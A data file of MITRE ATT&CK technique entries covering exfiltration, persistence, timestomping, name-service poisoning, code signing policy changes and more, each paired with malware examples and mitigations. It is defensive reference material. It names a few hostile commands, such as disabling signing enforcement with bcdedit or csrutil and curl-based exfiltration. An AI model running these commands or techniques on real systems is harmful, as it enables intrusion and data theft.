{"text": " Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).", "idx": "https://attack.mitre.org/techniques/T1020", "title": "Automated Exfiltration", "entity": "Automated Exfiltration", "entity_type": "techniques", "entity_context": ["Ebury can automatically exfiltrate gathered SSH credentials.", "When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server.", "Sidewinder has configured tools to automatically send collected files to attacker controlled servers.", "Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.", "Gamaredon Group has used modules that automatically upload gathered documents to the C2 server.", "Peppy has the ability to automatically exfiltrate files and keylogs.", "CosmicDuke exfiltrates collected files automatically over FTP to remote servers.", "Frankenstein has collected information via Empire, which is automatically sent the data back to the adversary's C2.", "LightNeuron can be configured to automatically exfiltrate files under a specified directory.", "Doki has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.", "USBStealer automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.", "Crutch has automatically exfiltrated stolen files to Dropbox.", "Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.\t", "Machete’s collected files are exfiltrated automatically to remote servers. ", "TajMahal has the ability to manage an automated queue of egress files and commands sent to its C2.", "ShimRatReporter sent collected system and network information compiled into a report to an adversary-controlled C2.", "Honeybee performs data exfiltration is accomplished through the following command-line command: <code>from <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt</code>.", "StrongPity can automatically exfiltrate collected documents to the C2 server.", "Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe."], "is_subtechnique": false}
{"text": " Adversaries can modify property list files (plist files) to execute their code as part of establishing persistence. Plist files are used by macOS applications to store properties and configuration settings for applications and services. Applications use information plist files, <code>Info.plist</code>, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values. Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup. Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library (dylib) by adding a dictionary containing the <code>DYLD_INSERT_LIBRARIES</code> key combined with a path to a malicious dylib under the <code>EnvironmentVariables</code> key in a plist file. Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space. Persistence can also be achieved by modifying the <code>LSEnvironment</code> key in the application's <code>Info.plist</code> file.(Citation: wardle artofmalware volume1)", "idx": "https://attack.mitre.org/techniques/T1547/011", "title": "Plist Modification", "entity": "Plist Modification", "entity_type": "techniques", "entity_context": ["XCSSET uses the <code>plutil</code> command to modify the <code>LSUIElement</code>, <code>DFBundleDisplayName</code>, and <code>CFBundleIdentifier</code> keys in the <code>/Contents/Info.plist</code> file.", "Holding the shift key during login prevents apps from opening automatically.", "Prevent plist files from being modified by users by making them read-only.", "Ensure applications are using Apple's developer guidance which enables hardened runtime."], "is_subtechnique": true}
{"text": " Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers. Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.", "idx": "https://attack.mitre.org/techniques/T1554", "title": "Compromise Client Software Binary", "entity": "Compromise Client Software Binary", "entity_type": "techniques", "entity_context": ["ThiefQuest searches through the <code>/Users/</code> folder looking for executable files. For each executable, ThiefQuest prepends a copy of itself to the beginning of the file. When the file is executed, the ThiefQuest code is executed first. ThiefQuest creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. ", "XCSSET uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.", "Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.", "Kobalos replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.", "Industroyer has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.", "Kessel has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.", "Ensure all application component binaries are signed by the correct application developers.", "Bonadan has maliciously altered the OpenSSH binary on targeted systems to create a backdoor."], "is_subtechnique": false}
{"text": " An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain) (Citation: OSX Keydnap malware) In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)", "idx": "https://attack.mitre.org/techniques/T1555/002", "title": "Securityd Memory", "entity": "Securityd Memory", "entity_type": "techniques", "entity_context": ["Keydnap uses the keychaindump project to read securityd memory."], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide) This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.", "idx": "https://attack.mitre.org/techniques/T1574/009", "title": "Path Interception by Unquoted Path", "entity": "Path Interception by Unquoted Path", "entity_type": "techniques", "entity_context": ["Empire contains modules that can discover and exploit unquoted path vulnerabilities.", "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations.", "Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.", "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."], "is_subtechnique": true}
{"text": " An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender. Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.", "idx": "https://attack.mitre.org/techniques/T1560", "title": "Archive Collected Data", "entity": "Archive Collected Data", "entity_type": "techniques", "entity_context": ["Daserf hides collected data in password-protected .rar archives.", "Agent Tesla can encrypt data with 3DES before sending it over to a C2 server.", "RunningRAT contains code to compress files.", "Lurid can compress data before sending it.", "NETWIRE has the ability to compress archived screenshots.", "Cadelspy has the ability to compress stolen data into a .cab file.", "VERMIN encrypts the collected files using 3-DES.", "Dtrack packs collected data into a password protected archive.", "BloodHound can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.", "XCSSET will compress entire <code>~/Desktop</code> folders excluding all <code>.git</code> folders, but only if the total data size is under 200MB.", "Proton zips up files before exfiltrating them.", "TAINTEDSCRIBE has used <code>FileReadZipSend</code> to compress a file and send to C2.", "Machete stores zipped files with profile data from installed web browsers. ", "After collecting documents from removable media, Prikormka compresses the collected files, and encrypts it with Blowfish.", "Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.", "System scans can be performed to identify unauthorized archival utilities.", "Patchwork encrypted the collected files' path with AES and then encoded them with base64.", "The Ke3chang group has been known to compress data before exfiltration.", "ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.", "Zebrocy  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.  ", "ShimRatReporter used LZ compression to compress initial reconnaissance reports before sending to the C2.\t", "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.", "Exaramel for Windows automatically encrypts files before sending them to the C2 server. ", "Epic encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.", "Aria-body has used ZIP to compress data gathered on a compromised host.", "APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration.", "Gold Dragon encrypts data using Base64 before being sent to the command and control server.", "Remexi encrypts and adds all gathered browser data into files for upload to C2.", "BLUELIGHT can zip files before exfiltration.", "menuPass has encrypted files and information before exfiltration.", "FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server.", "Dragonfly 2.0 compressed data into .zip files prior to exfiltrating it.", "Lazarus Group malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. ", "Emotet has been observed encrypting the data it collects before sending it to the C2 server. ", "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.", "Empire can ZIP directories on the target system.", "Pillowmint has encrypted stolen credit card information with AES and further encoded it with Base64.\t", "Kessel can RC4-encrypt credentials before sending to the C2.\t", "Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.", "Leviathan has archived victim's data prior to exfiltration.", "LightNeuron contains a function to encrypt and store emails that it collects.", "WellMail can archive files on the compromised host."], "is_subtechnique": false}
{"text": " Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda) One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)", "idx": "https://attack.mitre.org/techniques/T1568/003", "title": "DNS Calculation", "entity": "DNS Calculation", "entity_type": "techniques", "entity_context": ["APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port."], "is_subtechnique": true}
{"text": " Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)", "idx": "https://attack.mitre.org/techniques/T1070/006", "title": "Timestomp", "entity": "Timestomp", "entity_type": "techniques", "entity_context": ["TAINTEDSCRIBE can change the timestamp of specified filenames.", "Kobalos can modify timestamps of replaced files, such as <code>ssh</code> with the added credential stealer or <code>sshd</code> used to deploy Kobalos. ", "Shamoon can change the modified time for files to evade forensic detection.\t", "FALLCHILL can modify file or directory timestamps.", "POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.", "PowerStallion modifies the MAC times of its local log files to match that of the victim's desktop.ini file.", "TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.", "The Derusbi malware supports timestomping.", "EVILNUM has changed the creation date of files.", "APT28 has performed timestomping on victim files.", "InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times.", "Attor has manipulated the time of last access to files and registry keys after they have been created or modified.", "APT29 modified timestamps of backdoors to match legitimate Windows files.", "Elise performs timestomping of a CAB file it creates.", "APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.", "Empire can timestomp any files or payloads placed on a target machine to help them blend in.", "KeyBoy time-stomped its DLL in order to evade detection.", "Stuxnet extracts and writes driver files that match the times of other legitimate files.", "APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host.", "Bankshot modifies the time of a file as specified by the control server.", "USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.", "Cobalt Strike can timestomp any files or payloads placed on a target machine to help them blend in.", "China Chopper's server component can change the timestamp of files.", "Psylo has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.", "BLINDINGCAN has modified file and directory timestamps.", "For early Gazer versions, the compilation timestamp was faked.", "OSX_OCEANLOTUS.D can use the <code>touch -t</code> command to change timestamps.", "Chimera has used a Windows version of the Linux <code>touch</code> command to modify the date and time stamp on DLLs.", "SEASHARPEE can timestomp files on victims using a Web shell.", "Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.", "3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files.", "Rocke has changed the time stamp of certain files.\t", "After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.", "Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.", "OwaAuth has a command to timestop a file or directory.", "Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.", "BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool."], "is_subtechnique": true}
{"text": " Adversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service. One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood) Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)", "idx": "https://attack.mitre.org/techniques/T1499/002", "title": "Service Exhaustion Flood", "entity": "Service Exhaustion Flood", "entity_type": "techniques", "entity_context": ["Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies.", "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."], "is_subtechnique": true}
{"text": " Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds) Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1597/001", "title": "Threat Intel Vendors", "entity": "Threat Intel Vendors", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS) Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code", "idx": "https://attack.mitre.org/techniques/T1557/001", "title": "LLMNR/NBT-NS Poisoning and SMB Relay", "entity": "LLMNR/NBT-NS Poisoning and SMB Relay", "entity_type": "techniques", "entity_context": ["Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.", "Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity.", "Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services.", "Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment. ", "Responder is used to poison name services to gather hashes and credentials from systems within a local network.", "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level.", "Impacket modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution.", "Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks.", "PoshC2 can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.", "Empire can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks."], "is_subtechnique": true}
{"text": " Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "idx": "https://attack.mitre.org/techniques/T1570", "title": "Lateral Tool Transfer", "entity": "Lateral Tool Transfer", "entity_type": "techniques", "entity_context": ["LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.", "GALLIUM has used PsExec to move laterally between hosts in the target network.", "Lucifer can use certutil for propagation on Windows hosts within intranets.", "Consider using the host firewall to restrict file sharing communications such as SMB. ", "Expand can be used to download or upload a file over a network share.", "esentutl can be used to copy files to/from a remote share.", "DustySky searches for network drives and removable media and duplicates itself onto them.", "Operation Wocao has used SMB to copy files to and from target systems.", "Stuxnet uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. ", "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.", "Wizard Spider has used stolen credentials to copy tools into the <code>%TEMP%</code> directory of domain controllers.", "Sandworm Team has used <code>move</code> to transfer files to a network share. ", "Chimera has copied tools between compromised hosts using SMB.", "cmd can be used to copy files to/from a remotely connected internal system.", "Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems.", "WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.", "BITSAdmin can be used to create BITS Jobs to upload and/or download files from SMB file servers.", "PsExec can be used to download or upload a file over a network share.", "APT32 has deployed tools after moving laterally using administrative accounts.\t", "Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.", "Olympic Destroyer attempts to copy itself to remote machines on the network.", "Shamoon attempts to copy itself to remote machines on the network."], "is_subtechnique": false}
{"text": " Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP) Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot", "idx": "https://attack.mitre.org/techniques/T1553/006", "title": "Code Signing Policy Modification", "entity": "Code Signing Policy Modification", "entity_type": "techniques", "entity_context": ["APT39 has used malware to turn off the <code>RequireSigned</code> feature which ensures only signed DLLs can be run on Windows.", "Ensure proper permissions are set for the Registry to prevent users from modifying keys related to code signing policies.", "Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.", "Use of Secure Boot may prevent some implementations of modification to code signing policies.", "BlackEnergy has enabled the <code>TESTSIGNING</code> boot configuration option to facilitate loading of a driver component.", "Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.", "Limit the usage of local administrator and domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries."], "is_subtechnique": true}
{"text": " Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)", "idx": "https://attack.mitre.org/techniques/T1048", "title": "Exfiltration Over Alternative Protocol", "entity": "Exfiltration Over Alternative Protocol", "entity_type": "techniques", "entity_context": ["Bundlore uses the <code>curl -s -L -o</code> command to exfiltrate archived data to a URL.(citation: 20 macOS Common Tools and Techniques)", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.", "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.", "Kobalos can exfiltrate credentials over the network via UDP. ", "FrameworkPOS can use DNS tunneling for exfiltration of credit card data.", "Data loss prevention can detect and block sensitive data being uploaded via web browsers.", "Hydraq connects to a predefined domain on port 443 to exfil gathered information.", "PoetRAT has used a .NET tool named dog.exe to exiltrate information over an e-mail account.", "Chaes has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol. ", "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network."], "is_subtechnique": false}
{"text": " Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for. Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ) After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.", "idx": "https://attack.mitre.org/techniques/T1588/004", "title": "Digital Certificates", "entity": "Digital Certificates", "entity_type": "techniques", "entity_context": ["Lazarus Group has obtained SSL certificates for their C2 domains.", "Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability. When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).", "idx": "https://attack.mitre.org/techniques/T1029", "title": "Scheduled Transfer", "entity": "Scheduled Transfer", "entity_type": "techniques", "entity_context": ["ShimRat can sleep when instructed to do so by the C2.\t", "Machete sends stolen data to the C2 server every 10 minutes. ", "ShadowPad has sent data back to C2 every 8 hours.", "Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. ", "Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.", "Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.", "ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.", "jRAT can be configured to reconnect at certain intervals.", "POWERSTATS can sleep for a given number of seconds.", "ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).", "Kazuar can sleep for a specific time and be set to communicate at specific intervals.", "Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.", "LightNeuron can be configured to exfiltrate data during nighttime or working hours."], "is_subtechnique": false}
